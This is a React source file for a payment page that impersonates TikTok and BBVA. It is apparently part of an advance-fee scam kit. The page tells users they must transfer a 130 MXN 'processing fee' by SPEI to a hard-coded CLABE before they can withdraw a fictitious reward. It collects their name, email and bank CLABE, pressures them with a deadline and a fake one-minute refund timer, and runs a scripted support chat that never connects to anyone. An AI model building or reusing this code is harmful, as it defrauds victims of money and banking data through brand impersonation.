import { useEffect, useMemo, useRef, useState } from "react";
import { Logo } from "../components/Logo";
import { useAppState } from "../context/AppStateContext";
import { digitsOnly, formatClabe, isClabeLength, validateClabe } from "../lib/clabe";
import { getCampaignRewardCents } from "../lib/campaign";
import { formatMxn } from "../lib/money";
import {
  createPayment,
  getPaymentStatus,
  PAYMENT_POLL_INTERVAL_MS,
  PROCESSING_CENTS,
  VERIFY_WINDOW_MS,
  type SpeiInstructions,
} from "../lib/pagamento";
import { transitionTo } from "../lib/router";

const SPEI_PAYTO_CLABE = "684180417007054959";
const LOADING_STEP_MS = 800;
const WAIT_SECONDS = 60;
const COPY_RESTORE_MS = 1800;
const LOADING_STATUSES = ["Generando orden...", "Validando datos..."] as const;
const CHAT_GREETING =
  "¡Hola! Cuéntanos tu consulta y te responderemos a tu correo electrónico a la brevedad. 😊";
const CHAT_RECEIVED = "✅ Recibido. Te respondemos a tu correo a la brevedad.";
const CHAT_CONNECTING =
  "Estamos conectándote con un agente de soporte de TikTok Bonus, espera un momento.";
const CHAT_QUEUE_FULL =
  "Nuestra fila está muy saturada en este momento. Déjanos tu número de teléfono o correo y nos pondremos en contacto en cuanto un agente pueda, lo antes posible.";
const CHAT_CONNECT_WAIT_MS = 120_000;
const CHAT_AUTOCLOSE_MS = 4_000;

type GatewayState = "loading" | "ready" | "waiting" | "error" | "analysis";
type ErrorSource = "create" | "poll";
type ChatItem = { from: "bot" | "user"; text: string; loading?: boolean };

function initialChat(): ChatItem[] {
  return [{ from: "bot", text: CHAT_GREETING }];
}

function formatDeadline(at: Date) {
  return at.toLocaleString("es-MX", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "numeric",
    minute: "2-digit",
  });
}

function ConfirmationLogo() {
  const [failed, setFailed] = useState(false);
  return (
    <div className="confirmation-logo">
      {failed ? (
        <Logo word={false} />
      ) : (
        <img src="/images/logotiktok.png" alt="TikTok" onError={() => setFailed(true)} />
      )}
    </div>
  );
}

async function copyToClipboard(text: string): Promise<boolean> {
  try {
    window.focus();
    await navigator.clipboard.writeText(text);
    return true;
  } catch {
    /* fallback below */
  }
  try {
    const el = document.createElement("textarea");
    el.value = text;
    el.setAttribute("readonly", "");
    el.style.cssText = "position:fixed;top:0;left:0;width:1px;height:1px;padding:0;border:0;opacity:0";
    document.body.appendChild(el);
    el.focus();
    el.select();
    el.setSelectionRange(0, text.length);
    const ok = document.execCommand("copy");
    document.body.removeChild(el);
    return ok;
  } catch {
    return false;
  }
}

function CopyIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <rect x="9" y="9" width="13" height="13" rx="2" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  );
}

function CopiedCheckIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M5 12.5 9.2 16.7 19 7.5" />
    </svg>
  );
}

function LockIcon() {
  return (
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <rect x="5" y="11" width="14" height="10" rx="2" />
      <path d="M8 11V8a4 4 0 0 1 8 0v3" />
    </svg>
  );
}

function ClabeTick() {
  return (
    <span className="clabe-valid-tick" aria-hidden="true">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="11" fill="#14b8a6" />
        <path d="M7.2 12.4l3.1 3.1 6.5-6.6" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
      </svg>
    </span>
  );
}

function ShieldIcon() {
  return (
    <svg className="pg-seguro-shield" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
      <path
        fill="#0d9488"
        d="M12 2.2 4.8 5.1v6.2c0 4.7 3.2 8.9 7.2 10.5 4-1.6 7.2-5.8 7.2-10.5V5.1L12 2.2Z"
      />
      <path fill="#fff" d="M10.2 15.4 7.4 12.6l1.2-1.2 1.6 1.6 4.2-4.2 1.2 1.2-5.4 5.4Z" />
    </svg>
  );
}

function HeadsetIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M4.5 12a7.5 7.5 0 0 1 15 0" stroke="#fff" strokeWidth="2" strokeLinecap="round" />
      <rect x="3" y="11.5" width="4.2" height="7.2" rx="1.6" fill="#fff" />
      <rect x="16.8" y="11.5" width="4.2" height="7.2" rx="1.6" fill="#fff" />
      <path d="M20.8 18.6v1.1A2.6 2.6 0 0 1 18.2 22.2h-2" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  );
}

export function PaymentGateway() {
  const { userData, lastWithdrawalCents, patchUserData, setLastWithdrawal } = useAppState();
  const [view, setView] = useState<GatewayState>("loading");
  const [status, setStatus] = useState<string>(LOADING_STATUSES[0]);
  const [errorMessage, setErrorMessage] = useState("No se pudo finalizar la transacción. Inténtalo de nuevo.");
  const [errorSource, setErrorSource] = useState<ErrorSource>("create");
  const [clabe, setClabe] = useState(() => formatClabe(userData.clabe || userData.chave));
  const [clabeError, setClabeError] = useState<string | null>(null);
  const [inFlight, setInFlight] = useState(false);
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [reference, setReference] = useState("");
  const [instructions, setInstructions] = useState<SpeiInstructions | null>(null);
  const [createNonce, setCreateNonce] = useState(0);
  const [verifyAttemptId, setVerifyAttemptId] = useState(0);
  const [waitLeft, setWaitLeft] = useState(WAIT_SECONDS);
  const [helpOpen, setHelpOpen] = useState(false);
  const [comprovanteHint, setComprovanteHint] = useState("");
  const [chat, setChat] = useState<ChatItem[]>(initialChat);
  const [chatDraft, setChatDraft] = useState("");
  const [chatInvalid, setChatInvalid] = useState(false);
  const [chatBusy, setChatBusy] = useState(false);
  const [clabeCopied, setClabeCopied] = useState(false);

  const timeouts = useRef<number[]>([]);
  const copyRestoreRef = useRef(0);
  const intervals = useRef<number[]>([]);
  const alive = useRef(true);
  const polling = useRef(false);
  const pollBusy = useRef(false);
  const manualReceipt = useRef(false);
  const confirmedClabe = useRef(digitsOnly(userData.clabe || userData.chave));
  const userDataRef = useRef(userData);
  const fileRef = useRef<HTMLInputElement>(null);
  const chatBoxRef = useRef<HTMLDivElement>(null);
  const chatWaitRef = useRef(0);
  const chatCloseRef = useRef(0);
  const chatBusyRef = useRef(false);
  userDataRef.current = userData;

  useEffect(() => {
    const next = formatClabe(userData.clabe || userData.chave);
    if (next) {
      setClabe(next);
      confirmedClabe.current = digitsOnly(next);
    }
  }, [userData.clabe, userData.chave]);

  const creditCents = lastWithdrawalCents > 0 ? lastWithdrawalCents : getCampaignRewardCents();
  const deadline = useMemo(() => formatDeadline(new Date(Date.now() + 30 * 60 * 1000)), []);
  const showSheet = view === "ready" || view === "waiting";

  function clearTimers() {
    timeouts.current.forEach((id) => window.clearTimeout(id));
    intervals.current.forEach((id) => window.clearInterval(id));
    timeouts.current = [];
    intervals.current = [];
  }

  function clearChatTimers() {
    if (chatWaitRef.current) {
      window.clearTimeout(chatWaitRef.current);
      chatWaitRef.current = 0;
    }
    if (chatCloseRef.current) {
      window.clearTimeout(chatCloseRef.current);
      chatCloseRef.current = 0;
    }
  }

  useEffect(() => {
    alive.current = true;
    return () => {
      alive.current = false;
      polling.current = false;
      pollBusy.current = false;
      clearTimers();
      if (chatWaitRef.current) window.clearTimeout(chatWaitRef.current);
      if (chatCloseRef.current) window.clearTimeout(chatCloseRef.current);
    };
  }, []);

  function persistApproved(nextClabe: string) {
    const digits = digitsOnly(nextClabe);
    const current = userDataRef.current;
    patchUserData({
      nome: current.nome,
      email: current.email,
      clabe: digits,
      metodo: "SPEI",
    });
    setLastWithdrawal(creditCents);
    transitionTo("success");
  }

  function paymentPayload(digits: string) {
    const current = userDataRef.current;
    return {
      amount: PROCESSING_CENTS,
      customer_name: current.nome,
      customer_email: current.email,
      clabe: digits,
      payment_method: "SPEI" as const,
    };
  }

  useEffect(() => {
    setView("loading");
    setStatus(LOADING_STATUSES[0]);
    setInFlight(false);
    setClabeError(null);
    setComprovanteHint("");
    polling.current = false;
    manualReceipt.current = false;

    let index = 0;
    const cycle = window.setInterval(() => {
      index += 1;
      if (index >= LOADING_STATUSES.length) {
        window.clearInterval(cycle);
        return;
      }
      if (alive.current) setStatus(LOADING_STATUSES[index]);
    }, LOADING_STEP_MS);
    intervals.current.push(cycle);

    let cancelled = false;
    const current = userDataRef.current;
    const digits = digitsOnly(current.clabe || current.chave || confirmedClabe.current);

    async function startCreate() {
      if (!isClabeLength(digits)) {
        if (!cancelled && alive.current) setView("ready");
        return;
      }
      try {
        const result = await createPayment(paymentPayload(digits));
        if (cancelled || !alive.current) return;

        if (result.status === "ERROR") {
          setErrorSource("create");
          setErrorMessage(result.message);
          setView("error");
          return;
        }

        setPaymentId(result.payment_id);
        if (result.status === "SUCCESS") {
          setReference(result.reference);
          setInstructions(result.instructions);
          confirmedClabe.current = digits;
          setView("ready");
          return;
        }

        setReference(result.reference ?? "");
        setView("ready");
      } catch (error) {
        if (cancelled || !alive.current) return;
        setErrorSource("create");
        setErrorMessage(error instanceof Error ? error.message : "No se pudo generar la orden SPEI.");
        setView("error");
      }
    }

    void startCreate();

    return () => {
      cancelled = true;
      window.clearInterval(cycle);
    };
  }, [createNonce]);

  useEffect(() => {
    if (!showSheet) return;
    setWaitLeft(WAIT_SECONDS);
    const tick = window.setInterval(() => {
      setWaitLeft((left) => (left <= 0 ? 0 : left - 1));
    }, 1000);
    return () => window.clearInterval(tick);
  }, [showSheet]);

  useEffect(() => {
    if ((view !== "waiting" && view !== "analysis") || !paymentId) return;

    polling.current = true;
    pollBusy.current = false;
    let cancelled = false;

    async function tick() {
      if (cancelled || !alive.current || pollBusy.current || !paymentId) return;
      pollBusy.current = true;
      try {
        const result = await getPaymentStatus(paymentId);
        if (cancelled || !alive.current) return;
        if (result.status === "approved") {
          polling.current = false;
          persistApproved(confirmedClabe.current || clabe);
          return;
        }
        if (result.status === "failed") {
          polling.current = false;
          setErrorSource("poll");
          setErrorMessage("La Transferencia SPEI no pudo confirmarse. Inténtalo de nuevo.");
          setView("error");
        }
      } catch (error) {
        if (cancelled || !alive.current) return;
        polling.current = false;
        setErrorSource("poll");
        setErrorMessage(error instanceof Error ? error.message : "No se pudo consultar el estado SPEI.");
        setView("error");
      } finally {
        pollBusy.current = false;
      }
    }

    void tick();
    const interval = window.setInterval(() => {
      void tick();
    }, PAYMENT_POLL_INTERVAL_MS);
    intervals.current.push(interval);

    const windowTimer =
      view === "waiting"
        ? window.setTimeout(() => {
            if (cancelled || !alive.current) return;
            polling.current = false;
            setView("ready");
          }, VERIFY_WINDOW_MS)
        : 0;
    if (windowTimer) timeouts.current.push(windowTimer);

    return () => {
      cancelled = true;
      polling.current = false;
      pollBusy.current = false;
      window.clearInterval(interval);
      if (windowTimer) window.clearTimeout(windowTimer);
    };
  }, [view, paymentId, verifyAttemptId]);

  useEffect(() => {
    const box = chatBoxRef.current;
    if (box) box.scrollTop = box.scrollHeight;
  }, [chat, helpOpen]);

  async function confirmCredit() {
    if (inFlight || view === "waiting") return;
    const err = validateClabe(clabe);
    if (err) {
      setClabeError(err);
      return;
    }

    setClabeError(null);
    setInFlight(true);
    const digits = digitsOnly(clabe);
    confirmedClabe.current = digits;
    try {
      const createdDigits = digitsOnly(instructions?.clabe ?? userData.clabe);
      if (!paymentId || digits !== createdDigits) {
        const result = await createPayment(paymentPayload(digits));
        if (!alive.current) return;
        if (result.status === "ERROR") {
          setErrorSource("create");
          setErrorMessage(result.message);
          setView("error");
          return;
        }
        setPaymentId(result.payment_id);
        if (result.status === "SUCCESS") {
          setReference(result.reference);
          setInstructions(result.instructions);
        } else {
          setReference(result.reference ?? "");
        }
      }
      if (!alive.current) return;
      setVerifyAttemptId((n) => n + 1);
      setView("waiting");
    } catch (error) {
      if (!alive.current) return;
      setErrorSource("create");
      setErrorMessage(error instanceof Error ? error.message : "No se pudo confirmar el crédito.");
      setView("error");
    } finally {
      if (alive.current) setInFlight(false);
    }
  }

  function retry() {
    if (inFlight) return;
    if (errorSource === "poll" && paymentId) {
      setVerifyAttemptId((n) => n + 1);
      setView("waiting");
      return;
    }
    setCreateNonce((n) => n + 1);
  }

  async function ensurePayment() {
    if (paymentId) return paymentId;
    const digits = digitsOnly(clabe) || confirmedClabe.current;
    const result = await createPayment(paymentPayload(digits));
    if (!alive.current) return null;
    if (result.status === "ERROR") {
      setErrorSource("create");
      setErrorMessage(result.message);
      setView("error");
      return null;
    }
    setPaymentId(result.payment_id);
    if (result.status === "SUCCESS") {
      setReference(result.reference);
      setInstructions(result.instructions);
    } else {
      setReference(result.reference ?? "");
    }
    return result.payment_id;
  }

  function onComprovanteSelected() {
    const file = fileRef.current?.files?.[0];
    if (!file) return;
    setComprovanteHint(`Comprobante recibido: ${file.name}`);
    confirmedClabe.current = digitsOnly(clabe) || confirmedClabe.current;
    manualReceipt.current = true;
    polling.current = false;
    setView("analysis");
    if (!paymentId) void ensurePayment();
  }

  function closeHelp() {
    clearChatTimers();
    chatBusyRef.current = false;
    setHelpOpen(false);
    setChat(initialChat());
    setChatDraft("");
    setChatInvalid(false);
    setChatBusy(false);
  }

  function sendChat() {
    const msg = chatDraft.trim();
    if (!msg) {
      setChatInvalid(true);
      return;
    }
    if (chatBusyRef.current) return;
    chatBusyRef.current = true;
    setChatInvalid(false);
    setChatBusy(true);
    setChatDraft("");
    setChat((prev) => [
      ...prev,
      { from: "user", text: msg },
      { from: "bot", text: CHAT_RECEIVED },
      { from: "bot", text: CHAT_CONNECTING, loading: true },
    ]);

    const waitId = window.setTimeout(() => {
      if (!alive.current) return;
      setChat((prev) => [...prev.filter((item) => !item.loading), { from: "bot", text: CHAT_QUEUE_FULL }]);
      const closeId = window.setTimeout(() => {
        if (!alive.current) return;
        closeHelp();
      }, CHAT_AUTOCLOSE_MS);
      chatCloseRef.current = closeId;
      timeouts.current.push(closeId);
    }, CHAT_CONNECT_WAIT_MS);
    chatWaitRef.current = waitId;
    timeouts.current.push(waitId);
  }

  function renderChatPanel(panelId: string, withMainIds: boolean) {
    return (
      <div id={panelId} className="gateway-chat-panel" role="dialog" aria-label="Soporte">
        <div className="gateway-chat-header">
          <div className="gateway-chat-avatar" aria-hidden="true">
            <HeadsetIcon />
          </div>
          <div className="gateway-chat-meta">
            <div>Soporte</div>
            <div>Respondemos por email</div>
          </div>
          <button
            type="button"
            id={withMainIds ? "gateway-chat-close" : undefined}
            className="gateway-chat-close"
            aria-label="Cerrar"
            onClick={closeHelp}
          >
            ×
          </button>
        </div>
        <div className="gateway-chat-body">
          <div
            id={withMainIds ? "gateway-chat-messages" : undefined}
            className="gateway-chat-messages"
            ref={chatBoxRef}
          >
            {chat.map((item, index) => (
              <div
                key={`${item.from}-${index}`}
                className={`gateway-chat-bubble is-${item.from}${item.loading ? " is-loading" : ""}`}
                role={item.loading ? "status" : undefined}
              >
                {item.loading ? <span className="gateway-chat-spinner" aria-hidden="true" /> : null}
                <span>{item.text}</span>
              </div>
            ))}
          </div>
          <div className="gateway-chat-form">
            <textarea
              id={withMainIds ? "gateway-chat-msg" : undefined}
              placeholder="Escribe tu consulta aquí..."
              value={chatDraft}
              disabled={chatBusy}
              className={chatInvalid ? "is-invalid" : undefined}
              onChange={(e) => {
                setChatDraft(e.target.value);
                setChatInvalid(false);
              }}
              onKeyDown={(e) => {
                if (e.key === "Enter" && !e.shiftKey) {
                  e.preventDefault();
                  sendChat();
                }
              }}
            />
            <button type="button" id={withMainIds ? "gateway-chat-send" : undefined} disabled={chatBusy} onClick={sendChat}>
              Enviar mensaje
            </button>
          </div>
        </div>
      </div>
    );
  }

  async function copyPayToClabe() {
    const digits = digitsOnly(instructions?.clabe || SPEI_PAYTO_CLABE);
    const ok = await copyToClipboard(digits);
    if (!ok || !alive.current) return;
    setClabeCopied(true);
    window.clearTimeout(copyRestoreRef.current);
    const id = window.setTimeout(() => {
      if (alive.current) setClabeCopied(false);
    }, COPY_RESTORE_MS);
    copyRestoreRef.current = id;
    timeouts.current.push(id);
  }

  const shownReference = reference || instructions?.reference || "—";
  const payToClabe = formatClabe(instructions?.clabe || SPEI_PAYTO_CLABE);
  const shownClabe = payToClabe;

  const instructionStack = (
    <div className="pg-instruction-stack">
      <div id="gateway-deadline-box" className="gateway-deadline-box">
        <span>⌛ Válido hasta </span>
        <span id="gateway-deadline">{deadline}</span>
      </div>

      <div className="gateway-warning">
        <span aria-hidden="true">⚠️</span>
        <p id="gateway-warning-text">
          El pago solo será válido si lo envías desde una cuenta registrada con la <strong>CLABE</strong> que
          ingresaste. Transfiere exactamente el <strong>Monto de Procesamiento</strong> de{" "}
          <strong>{formatMxn(PROCESSING_CENTS)}</strong> por Transferencia SPEI. Si el titular o el monto no
          coinciden, la validación puede demorar hasta 24 horas.
        </p>
      </div>

      <div id="gateway-cvu-status" className="gateway-cvu-status">
        {view === "waiting" ? `Esperando confirmación SPEI... (${waitLeft})` : `Esperando pago... (${waitLeft})`}
      </div>

      <p id="gateway-detect-msg" className="gateway-detect-msg">
        Estamos detectando tu Transferencia SPEI. Si no se confirma sola, usa el botón{" "}
        <strong>«Ya realicé el pago»</strong> para subir el comprobante.
      </p>

      <div id="gateway-comprovante-wrap" className="gateway-comprovante-wrap">
        <input
          ref={fileRef}
          type="file"
          id="gateway-comprovante-input"
          accept="image/*,application/pdf"
          hidden
          onChange={onComprovanteSelected}
        />
        <button type="button" id="gateway-comprovante-btn" onClick={() => fileRef.current?.click()}>
          Ya realicé el pago
        </button>
        <p id="gateway-comprovante-hint" className="gateway-comprovante-hint">
          {comprovanteHint}
        </p>
      </div>

      <div className="gateway-help">
        <button
          type="button"
          id="gateway-help-btn"
          onClick={() => (helpOpen ? closeHelp() : setHelpOpen(true))}
        >
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
          </svg>
          ¿Necesitás ayuda?
        </button>
        {helpOpen ? renderChatPanel("gateway-chat-panel", true) : null}
      </div>
    </div>
  );

  return (
    <section className="withdraw-flow-panel payment-flow-panel">
      <div className="confirmation-container">
        <div className="confirmation-header">
          <ConfirmationLogo />
        </div>

        {view === "loading" ? (
          <div id="gateway-loading" className="pg-loading" role="status" aria-live="polite">
            <div className="pg-spinner" aria-hidden="true" />
            <div className="pg-loading-status">{status}</div>
          </div>
        ) : null}

        {view === "error" ? (
          <div id="gateway-error" className="pg-error">
            <p>{errorMessage}</p>
            <button type="button" className="btn btn-block pg-confirm-btn" onClick={retry}>
              Reintentar
            </button>
          </div>
        ) : null}

        {view === "analysis" ? (
          <div id="gateway-analise" className="gateway-analise">
            <div className="gateway-intro">
              <p>
                Para continuar con el retiro del monto disponible, necesitamos confirmar la titularidad de tu
                cuenta con una transacción real. Es necesario un pago de{" "}
                <strong>{formatMxn(PROCESSING_CENTS)}</strong> por Transferencia SPEI para verificar tu cuenta.
                Este monto será acreditado en tu saldo disponible para retiro.
              </p>
            </div>

            <div className="confirmation-section">
              <div className="confirmation-section-title">DATOS PARA EL REEMBOLSO</div>
              <div className="confirmation-receipt-grid">
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Nombre</div>
                  <div id="checkout-confirmation-name" className="confirmation-receipt-value">
                    {userData.nome || "—"}
                  </div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Correo</div>
                  <div id="checkout-confirmation-email" className="confirmation-receipt-value">
                    {userData.email || "—"}
                  </div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Valor a recibir</div>
                  <div id="checkout-confirmation-valor" className="confirmation-receipt-value bold">
                    {formatMxn(creditCents)} + {formatMxn(PROCESSING_CENTS)}
                  </div>
                </div>
              </div>
            </div>

            <div className="confirmation-section" id="gateway-payment-section">
              <div className="confirmation-section-title">PAGO SEGURO</div>
              <div className="gateway-analise-icon" aria-hidden="true">
                <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="#fff" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12" />
                </svg>
              </div>
              <div className="gateway-analise-title">Comprobante recibido</div>
              <p>Tu pago está en análisis. En breve recibirás la confirmación y el reembolso será acreditado en tu cuenta.</p>
            </div>
          </div>
        ) : null}

        {showSheet ? (
          <div className="pg-ready">
            <p className="pg-intro">Para continuar con el retiro del monto disponible, necesitamos confirmar la titularidad de tu cuenta con una transacción real. Es necesario un pago de <strong>$130,00 MXN</strong> para verificar tu cuenta. Este monto será acreditado en tu saldo disponible para retiro.</p>

            <div className="confirmation-section">
              <div className="confirmation-section-title">RESUMEN</div>
              <div className="confirmation-receipt-grid">
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Monto de Procesamiento</div>
                  <div className="confirmation-receipt-value">{formatMxn(PROCESSING_CENTS)}</div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Crédito Total</div>
                  <div className="confirmation-receipt-value bold">{formatMxn(creditCents)}</div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Método</div>
                  <div className="confirmation-receipt-value">Transferencia SPEI</div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">Referencia</div>
                  <div className="confirmation-receipt-value">{shownReference}</div>
                </div>
                <div className="confirmation-receipt-item">
                  <div className="confirmation-receipt-label">CLABE</div>
                  <div className="confirmation-receipt-value">{shownClabe}</div>
                </div>
              </div>
            </div>

            <div className="confirmation-section">
              <div className="pg-seguro-head">
                <div className="pg-seguro-title">
                  <span>Pago Seguro</span>
                  <ShieldIcon />
                </div>
                <p className="pg-seguro-copy">
                  Tu reembolso está garantizado por Banco{" "}
                  <img src="/images/bbva-logo.jpg" alt="BBVA" className="pg-seguro-bbva" />
                  , autorizado oficial de TikTok.
                </p>
              </div>

              <p className="pg-payto-lead">Transfiere el monto exacto a:</p>

              <div className="pg-payto-box">
                <span className="field-label">CLABE</span>
                <div className="pg-payto-clabe" id="pg-payto-clabe">
                  <span className="pg-payto-clabe-value">{payToClabe}</span>
                  <button
                    type="button"
                    id="pg-payto-copy"
                    className={`pg-payto-copy${clabeCopied ? " is-copied" : ""}`}
                    onClick={() => void copyPayToClabe()}
                    aria-label={clabeCopied ? "CLABE copiada" : "Copiar CLABE"}
                    aria-live="polite"
                  >
                    <span className="pg-payto-copy-icon" key={clabeCopied ? "ok" : "copy"}>
                      {clabeCopied ? <CopiedCheckIcon /> : <CopyIcon />}
                    </span>
                    <span className="pg-payto-copy-label">{clabeCopied ? "Copiado" : "Copiar"}</span>
                  </button>
                </div>
                <p className="field-hint">18 dígitos · Transferencia SPEI</p>
                <div className="pg-payto-monto">
                  <span>Monto</span>
                  <strong>$130.00 MXN</strong>
                </div>
              </div>

              <label className={`field pg-clabe-locked${isClabeLength(clabe) ? " is-valid-clabe" : ""}${clabeError ? " is-invalid" : ""}`}>
                <span className="field-label">Tu CLABE de reembolso</span>
                <span className={`field-input-wrap${isClabeLength(clabe) ? " is-valid" : ""}`}>
                  <input
                    id="pg-clabe"
                    type="tel"
                    inputMode="numeric"
                    autoComplete="off"
                    readOnly
                    value={clabe}
                    aria-readonly="true"
                  />
                  {isClabeLength(clabe) ? <ClabeTick /> : null}
                </span>
                {clabeError ? (
                  <p className="field-error">{clabeError}</p>
                ) : (
                  <p className="field-hint">Cuenta donde recibirás el reembolso</p>
                )}
              </label>

              {view === "waiting" ? (
                <div id="gateway-waiting" className="pg-waiting-banner" role="status" aria-live="polite">
                  <div className="pg-spinner pg-spinner-sm" aria-hidden="true" />
                  <div>
                    <div className="pg-loading-status">Esperando confirmación SPEI...</div>
                    <p className="pg-waiting-ref">Referencia {shownReference}</p>
                  </div>
                </div>
              ) : (
                <button
                  type="button"
                  id="pg-confirm"
                  className="btn btn-block pg-confirm-btn"
                  disabled={inFlight}
                  aria-busy={inFlight}
                  onClick={() => void confirmCredit()}
                >
                  Confirmar Crédito
                </button>
              )}
            </div>

            {instructionStack}
          </div>
        ) : null}

        <div className="confirmation-footer">
          <div className="confirmation-footer-text">Proceso 100% seguro</div>
          <button
            type="button"
            id="btn-voltar-ten"
            className="gateway-back-link"
            disabled={inFlight}
            onClick={() => transitionTo("five")}
          >
            Volver y corregir datos
          </button>
          <div className="gateway-footer-extras">
            <div className="confirmation-timer">
              <LockIcon />
              Reembolso automático en 1 minuto
            </div>
            <div className="confirmation-footer-text">Proceso 100% seguro</div>
            <button type="button" className="confirmation-footer-link" onClick={() => setHelpOpen(true)}>
              ¿Necesitas ayuda?
            </button>
          </div>
        </div>

        {helpOpen && view === "analysis" ? (
          <div className="gateway-help">{renderChatPanel("gateway-chat-panel-analise", false)}</div>
        ) : null}
      </div>
    </section>
  );
}
